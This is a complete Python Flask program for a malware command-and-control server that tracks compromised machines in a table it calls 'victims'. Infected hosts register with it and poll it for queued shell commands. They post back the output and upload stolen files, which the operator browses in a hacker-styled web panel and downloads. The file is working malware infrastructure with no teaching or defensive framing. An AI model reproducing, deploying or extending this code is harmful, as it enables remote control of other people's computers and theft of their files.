import os, sqlite3, datetime, json
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DB = "c2.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS victims (id TEXT PRIMARY KEY, info TEXT, last_seen TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, issued TEXT, status TEXT, result TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT, data BLOB)")
    conn.commit()
    conn.close()

init_db()

HTML = """
<!DOCTYPE html>
<html>
<head><title>C2 Panel</title><style>
body { font-family: monospace; background: black; color: lime; padding: 20px; }
table { border-collapse: collapse; width: 100%; }
th, td { border: 1px solid lime; padding: 8px; text-align: left; }
a { color: lime; }
</style></head>
<body>
<h1>C2 Sessions</h1>
<table>
<tr><th>ID</th><th>Info</th><th>Last Seen</th><th>Action</th></tr>
{% for v in victims %}
<tr>
<td>{{ v.id }}</td>
<td><pre>{{ v.info }}</pre></td>
<td>{{ v.last_seen }}</td>
<td><a href="/session/{{ v.id }}">Interact</a></td>
</tr>
{% endfor %}
</table>
<p><a href="/downloads">Downloaded Files</a></p>
</body>
</html>
"""

SESSION_HTML = """
<!DOCTYPE html>
<html>
<head><title>Session {{ victim_id }}</title><style>body{font-family:monospace;background:black;color:lime;}pre{color:lime;}</style></head>
<body>
<h1>Session: {{ victim_id }}</h1>
<h2>Send Command</h2>
<form method="post">
<input type="text" name="command" size="80" placeholder="e.g., dir C:\\">
<input type="submit" value="Execute">
</form>
<h2>Command History</h2>
<table border=1>
<tr><th>ID</th><th>Command</th><th>Issued</th><th>Status</th><th>Result</th></tr>
{% for cmd in commands %}
<tr>
<td>{{ cmd.id }}</td>
<td>{{ cmd.command }}</td>
<td>{{ cmd.issued }}</td>
<td>{{ cmd.status }}</td>
<td><pre>{{ cmd.result[:200] if cmd.result else '' }}</pre></td>
</tr>
{% endfor %}
</table>
</body>
</html>
"""

@app.route("/")
def index():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT id, info, last_seen FROM victims ORDER BY last_seen DESC")
    victims = [{"id": row[0], "info": row[1][:100], "last_seen": row[2]} for row in c.fetchall()]
    conn.close()
    return render_template_string(HTML, victims=victims)

@app.route("/session/<victim_id>", methods=["GET", "POST"])
def session(victim_id):
    if request.method == "POST":
        command = request.form["command"]
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, issued, status) VALUES (?, ?, ?, 'pending')",
                  (victim_id, command, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT id, command, issued, status, result FROM commands WHERE victim_id = ? ORDER BY id DESC", (victim_id,))
    commands = [{"id": row[0], "command": row[1], "issued": row[2], "status": row[3], "result": row[4]} for row in c.fetchall()]
    conn.close()
    return render_template_string(SESSION_HTML, victim_id=victim_id, commands=commands)

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    victim_id = f"{data['computer']}_{data['user']}"
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO victims (id, info, last_seen) VALUES (?, ?, ?)",
              (victim_id, json.dumps(data), datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return "OK"

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json
    victim_id = data["victim_id"]
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("UPDATE victims SET last_seen = ? WHERE id = ?", (datetime.datetime.now().isoformat(), victim_id))
    conn.commit()
    conn.close()
    return "OK"

@app.route("/poll/<victim_id>", methods=["GET"])
def poll(victim_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE victim_id = ? AND status = 'pending' ORDER BY id LIMIT 1", (victim_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({"id": row[0], "command": row[1]})
    conn.close()
    return jsonify({})

@app.route("/result/<victim_id>", methods=["POST"])
def result(victim_id):
    data = request.json
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("UPDATE commands SET status = 'done', result = ? WHERE id = ?", (data.get("output"), data.get("cmd_id")))
    conn.commit()
    conn.close()
    return "OK"

@app.route("/upload/<victim_id>", methods=["POST"])
def upload(victim_id):
    file = request.files["file"]
    filename = file.filename
    data = file.read()
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("INSERT INTO files (victim_id, filename, data) VALUES (?, ?, ?)", (victim_id, filename, data))
    conn.commit()
    conn.close()
    return "OK"

@app.route("/downloads")
def list_downloads():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT id, victim_id, filename FROM files")
    rows = c.fetchall()
    conn.close()
    if not rows:
        return "No files uploaded yet."
    html = "<h1>Downloaded Files</h1><ul>"
    for row in rows:
        html += f"<li><a href='/download/{row[0]}'>{row[1]} - {row[2]}</a></li>"
    html += "</ul><a href='/'>Back</a>"
    return html

@app.route("/download/<int:file_id>")
def download_file(file_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT filename, data FROM files WHERE id = ?", (file_id,))
    row = c.fetchone()
    conn.close()
    if row:
        from flask import send_file
        import io
        return send_file(io.BytesIO(row[1]), download_name=row[0], as_attachment=True)
    return "Not found"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
